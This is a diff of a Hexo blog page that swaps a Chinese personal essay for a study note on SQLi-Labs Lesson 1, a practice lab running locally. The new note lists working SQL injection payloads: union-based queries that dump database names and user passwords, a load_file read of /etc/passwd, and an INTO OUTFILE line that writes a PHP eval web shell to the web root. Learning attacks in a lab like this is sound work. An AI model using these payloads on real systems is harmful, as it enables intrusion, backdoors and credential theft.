@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="随笔,">
+  <meta name="keywords" content="Hexo, NexT">
 
 
 
@@ -79,18 +79,17 @@
 
 
 
-<meta name="description" content="引言如果一切都可以重来，你会选择怎样的开始？">
-<meta name="keywords" content="随笔">
+<meta name="description" content="Lesson 1 : GET - Error based - Single quotes - String // GET-基于错误的-单引号-字符型 小知识12345678%20 -&amp;gt; （空格）直接在浏览器中执行，要使用必须写%20%22 -&amp;gt; &amp;quot; %23 -&amp;gt; # 直接在浏览器中执行，要使用必须写%23%25 -&amp;gt; %%27 -&amp;gt; &amp;apos;注:1. 做">
 <meta property="og:type" content="article">
-<meta property="og:title" content="恰同学少年">
-<meta property="og:url" content="http://yoursite.com/2018/12/28/恰同学少年/index.html">
+<meta property="og:title" content="SQLi-Labs学习笔记1~4">
+<meta property="og:url" content="http://yoursite.com/2019/01/07/SQLi-Labs学习笔记1-4/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="引言如果一切都可以重来，你会选择怎样的开始？">
+<meta property="og:description" content="Lesson 1 : GET - Error based - Single quotes - String // GET-基于错误的-单引号-字符型 小知识12345678%20 -&amp;gt; （空格）直接在浏览器中执行，要使用必须写%20%22 -&amp;gt; &amp;quot; %23 -&amp;gt; # 直接在浏览器中执行，要使用必须写%23%25 -&amp;gt; %%27 -&amp;gt; &amp;apos;注:1. 做">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-01-02T02:59:05.654Z">
+<meta property="og:updated_time" content="2019-01-07T07:53:36.863Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="恰同学少年">
-<meta name="twitter:description" content="引言如果一切都可以重来，你会选择怎样的开始？">
+<meta name="twitter:title" content="SQLi-Labs学习笔记1~4">
+<meta name="twitter:description" content="Lesson 1 : GET - Error based - Single quotes - String // GET-基于错误的-单引号-字符型 小知识12345678%20 -&amp;gt; （空格）直接在浏览器中执行，要使用必须写%20%22 -&amp;gt; &amp;quot; %23 -&amp;gt; # 直接在浏览器中执行，要使用必须写%23%25 -&amp;gt; %%27 -&amp;gt; &amp;apos;注:1. 做">
 
 
 
@@ -120,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/12/28/恰同学少年/">
+  <link rel="canonical" href="http://yoursite.com/2019/01/07/SQLi-Labs学习笔记1-4/">
 
 
 
 
 
-  <title>恰同学少年 | Hexo</title>
+  <title>SQLi-Labs学习笔记1~4 | Hexo</title>
   
 
 
@@ -233,7 +232,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/28/恰同学少年/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/07/SQLi-Labs学习笔记1-4/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -250,7 +249,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">恰同学少年</h1>
+          <h1 class="post-title" itemprop="name headline">SQLi-Labs学习笔记1~4</h1>
         
 
         <div class="post-meta">
@@ -262,8 +261,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-28T17:13:50+08:00">
-                2018-12-28
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-07T15:53:19+08:00">
+                2019-01-07
               </time>
             
 
@@ -300,25 +299,19 @@
       
 
       
-        <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>如果一切都可以重来，你会选择怎样的开始？</p>
+        <h3 id="Lesson-1-GET-Error-based-Single-quotes-String"><a href="#Lesson-1-GET-Error-based-Single-quotes-String" class="headerlink" title="Lesson 1 : GET - Error based - Single quotes - String"></a>Lesson 1 : GET - Error based - Single quotes - String</h3><hr>
+<p>// GET-基于错误的-单引号-字符型</p>
+<h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%20 -&gt; （空格）直接在浏览器中执行，要使用必须写%20</span><br><span class="line">%22 -&gt; &quot; </span><br><span class="line">%23 -&gt; # 直接在浏览器中执行，要使用必须写%23</span><br><span class="line">%25 -&gt; %</span><br><span class="line">%27 -&gt; &apos;</span><br><span class="line">注:</span><br><span class="line">1. 做注释使用#放在地址栏必须编码%23</span><br><span class="line">2. 做注释使用--放在地址栏必须加空格后再加字母(例如 -- a), 或者使用--+</span><br></pre></td></tr></table></figure>
 <a id="more"></a>
-<h2 id="遥远的Ta"><a href="#遥远的Ta" class="headerlink" title="遥远的Ta"></a>遥远的Ta</h2><p>如果你有兴趣继续看下去，也许也会有耐心听我介绍自己的过去：一个遥远的过去，犹如梦境中的清晨，晶莹剔透的雨滴，顺着老屋的瓦，缓缓坠入沟渠。那是一个仿佛已经很久远的年代。那时候的村庄，没有手机，没有互联网，也没有“非常6+1”的幸运观众。有的只是青山，有的只是小溪，还有傍晚夕阳西下时升起的袅袅炊烟。而我，就是在这个宛如与世隔绝的村庄，度过了人生最初的十年。</p>
-<h2 id="邂逅死亡"><a href="#邂逅死亡" class="headerlink" title="邂逅死亡"></a>邂逅死亡</h2><p>在记忆中某个已褪色的冬天，暴雨过后河水暴涨，叫嚣着漫过河堤，淹没原野。当时的我穿着厚重的大棉衣，流着鼻涕，一个人在河堤上慢慢地走着。已经记不清当时为什么要沿着河堤走(回家)，只记得脚下的河堤突然垮了，一脚踏空的我掉入洪水中。而周围，一个人都没有。</p>
-<p>河水咆哮着灌入我的衣服里，发出类似于往玻璃瓶中倒水的声音。我下意识地往岸边游去，伸出手想要抓住什么。然而，洪水却以更快的速度把我往下游推。当时年幼的我头脑一片空白，意识到“我可能会死”。</p>
-<p>死亡对一个孩子来说，意味着什么？我不知道，只是感到一股难以抵抗的恐惧感，唯一能做的就是臣服于本能 —— 我猛地把头扎入冰冷的水中，使出了全身的力气，以潜泳的方式拼命地往岸边游去终于，我抓住了什么东西，顺势爬上了岸边，像一条落水狗一样，趴在岸边喘着粗气、瑟瑟发抖。</p>
-<h2 id="平凡之路"><a href="#平凡之路" class="headerlink" title="平凡之路"></a>平凡之路</h2><p>也许是因为那段宛如梦境的经历，让我的整个求学生涯都伴随着某种形式上的孤独感。虽然已经记不清楚，自己怎么一个人走过来的。整个求学期间，“不合群”给别人的最大感觉。与其说“不合群”，不如说“气质不对”（主要看气质）—— 大概给人一种“看不出有什么太奇怪，但就是和我们不一样”的感觉吧。于是乎，我一个人去看书、一个人去长跑、一个人去做那些可以一个人能做好的事情。在读书期间，孤独给我的不止是夜间路灯下那个形单影只的背影，还有某种程度上的钝感。后来，依赖着类似于堂吉诃德式的勇气，我走完了整个小初高中，走向了大学。</p>
-<p>而我的大学，并没有让我达到某个方面某种质的飞跃，也没有什么专业性积累，这也算是某种程度上的虚度光阴吧。在大学期间，开始逐渐接触到这么一种说法，即“为编程而生”。 </p>
-<blockquote>
-<p>你不仅得有天赋，还得具备激情，才能成为一名优秀的程序员。<br>…<br>好像那些写代码的人是早就决定干这一行似的，“当他们还是孩子的时候，他们就打算将来去写代码”。如果你缺少这两个因素之一，那么你要么是一个骗子，要么不会走得太远。</p>
-</blockquote>
-<p>我从来都不觉得自己有过什么天赋，更不会有那种“为编程而生”的感觉。在专业课学得不好的时候，也会怀疑自己是不是选错专业了。然而，地球在转动，生活也要继续，我唯一能做的，就是学好专业知识，以期毕业后能混口饭吃。既然已经选择，又无讨价的余地，唯有硬着头皮上了。既便如此，“闭门造车”坏习惯很快成为我的拦路虎，整个大学都是重复“上课睡觉，考前预习”的模式。在挂了几科后，甚至一度怀疑自己能否顺利毕业，也算是“学渣”的烦恼吧。直到后来接触到鱼C，才觉得稍微有点编程姿态，也渐渐有点程序员的样子。</p>
-<p>言及方法，也许是因为社会节奏越来越快，社会上弥漫着一股类似于“方法不对，努力白费”、“如果方向错了，停止就是进步”的言论。浮躁让我们把注重点放在“方法”、“秘诀”之类的捷径上，而忽略了努力本身。试想，从小喝的鸡汤，对我们的进步是否真的有所帮助？</p>
-<p>今年七月初，我只身一人飞到深圳，这个从未涉足的城市。从没有想过要“出任CEO，迎娶白富美，走向人生巅峰”，只想着怎么自力更生，养活自己。快3个月过去了，我很幸运地找到了一份工作，和无数慕名而来的年轻人一样，挥洒着自己的汗水，为了一个可能更美好的明天奋斗着。</p>
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>回到最开始的问题“如果一切都可以重来，你会选择怎样的开始？现在跳到另一个问题“如果一切都只能继续，你会选择怎样的继续？” </p>
-<blockquote>
-<p>众里寻她，如果找到的只是无奈，你是否继续等待？<br>蓦然回首，如果剩下的只有苍白，你是否能够释怀？</p>
-</blockquote>
-<p>执着于自己的执着，落寞于自己的错过，带着伤痛和坚毅，每个人都能走得更远。</p>
+<h4 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h4><p><a href="http://127.0.0.1:8088/Less-1/?id=1" target="_blank" rel="noopener">http://127.0.0.1:8088/Less-1/?id=1</a></p>
+<p>正常显示，加单引号后报错，试到?id=1’ or ‘1’=’1时正常显示。</p>
+<p>这时我们再尝试下注释语句，得出以下语句也是成功的。</p>
+<p>?id=1’ or 1=1 –%20<br>?id=1’ or 1=1%23</p>
+<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><h5 id="使用oder-by查询字段"><a href="#使用oder-by查询字段" class="headerlink" title="使用oder by查询字段"></a>使用oder by查询字段</h5><p>?id=1’ order by 5%23 </p>
+<p>采用折半查找，找到一个最大的不报错的数字，则为该表的字段长度，这里为3。</p>
+<h5 id="查询回显点"><a href="#查询回显点" class="headerlink" title="查询回显点"></a>查询回显点</h5><p>?id=-1’ union select 1,2,3%23</p>
+<p>图片中只回显2，3，可知回显点为第二、第三个字段，所以我们之后查询的内容要放在第二、第三字段才会显示。</p>
+<h5 id="MySQL常用查询"><a href="#MySQL常用查询" class="headerlink" title="MySQL常用查询"></a>MySQL常用查询</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">基本查询</span><br><span class="line">数据库版本：version()</span><br><span class="line">当前数据库：database()</span><br><span class="line">当前用户：user()</span><br><span class="line">os版本：@@version_compile_os</span><br><span class="line">数据库路径：@@basedir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">用冒号连接：concat_ws(char(32,58,32),user(),database(),version())</span><br><span class="line"></span><br><span class="line">写入一句话木马：</span><br><span class="line">id=223 union select &quot;&lt;?php &quot;,&quot; @eval($_POST[&apos;c&apos;]);&quot;, &quot; ?&gt;&quot;  into  outfile &quot;/var/www/html/mmm.php&quot; </span><br><span class="line">常用路径有：/var/www/, /var/www/html, /usr/local/apache2/htdocs, /var/www/nginx-default, /srv/www</span><br><span class="line"></span><br><span class="line">文件读取：load_file(&apos;/etc/passwd&apos;)</span><br><span class="line"></span><br><span class="line">查询所有数据库</span><br><span class="line">(select group_concat(schema_name) from information_schema.schemata)</span><br><span class="line">依据数据库查询表名</span><br><span class="line">(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;)</span><br><span class="line">依据数据库、表名查询列名</span><br><span class="line">(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;)</span><br><span class="line">查询用户名密码</span><br><span class="line">(select group_concat(username separator &apos;;&apos;) from users),(select group_concat(password separator &apos;;&apos;) from users)</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -334,12 +327,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/随笔/" rel="tag"># 随笔</a>
-          
-        </div>
-      
 
       
       
@@ -349,15 +336,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2019/01/02/SQLi-Labs_Lessons_1-4/" rel="next" title="SQLi-Labs学习笔记">
+                <i class="fa fa-chevron-left"></i> SQLi-Labs学习笔记
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/01/02/Docker个人笔记/" rel="prev" title="Docker个人笔记">
-                Docker个人笔记 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -480,7 +467,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#引言"><span class="nav-number">1.</span> <span class="nav-text">引言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#遥远的Ta"><span class="nav-number">2.</span> <span class="nav-text">遥远的Ta</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#邂逅死亡"><span class="nav-number">3.</span> <span class="nav-text">邂逅死亡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#平凡之路"><span class="nav-number">4.</span> <span class="nav-text">平凡之路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后记"><span class="nav-number">5.</span> <span class="nav-text">后记</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Lesson-1-GET-Error-based-Single-quotes-String"><span class="nav-number">1.</span> <span class="nav-text">Lesson 1 : GET - Error based - Single quotes - String</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#小知识"><span class="nav-number">1.1.</span> <span class="nav-text">小知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#正文"><span class="nav-number">1.2.</span> <span class="nav-text">正文</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#思路"><span class="nav-number">1.3.</span> <span class="nav-text">思路</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#使用oder-by查询字段"><span class="nav-number">1.3.1.</span> <span class="nav-text">使用oder by查询字段</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#查询回显点"><span class="nav-number">1.3.2.</span> <span class="nav-text">查询回显点</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MySQL常用查询"><span class="nav-number">1.3.3.</span> <span class="nav-text">MySQL常用查询</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
